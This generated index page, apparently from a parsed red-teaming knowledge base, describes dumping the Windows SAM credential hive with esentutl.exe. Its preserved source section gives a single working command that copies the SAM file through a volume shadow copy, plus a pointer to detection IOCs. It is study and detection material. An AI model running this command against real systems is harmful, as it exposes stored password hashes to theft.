---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping SAM via esentutl.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-sam-via-esentutl.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping SAM via esentutl.exe](../../topics/offensive-security/dumping-sam-via-esentutl.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-dumping-sam-via-esentutl.exe |
| name | Dumping SAM via esentutl.exe |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (632).png
- image (633).png
_body: '# Dumping SAM via esentutl.exe


  ## Execution


  It''s possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:


  ```

  esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam

  ```


  ![](<../../.gitbook/assets/image (632).png>)


  ## Observation


  The below are some potential IOCs for detecting this technique:


  ![](<../../.gitbook/assets/image (633).png>)


  ## References


  {% embed url="https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running" %}'
_relative_path: offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe.md
````
